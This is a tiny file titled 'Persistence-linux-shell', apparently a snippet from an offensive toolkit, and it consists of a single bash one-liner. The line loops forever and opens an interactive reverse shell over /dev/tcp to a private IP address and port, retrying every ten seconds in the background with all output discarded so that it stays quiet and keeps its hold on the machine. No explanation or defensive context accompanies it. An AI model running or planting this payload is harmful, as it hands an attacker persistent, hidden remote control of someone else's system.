# Persistence-linux-shell

while true; do setsid /bin/bash -i 5<> /dev/tcp/192.168.1.106/4007 0<&5 1>&5 2>&5; sleep 10; done &>/dev/null &
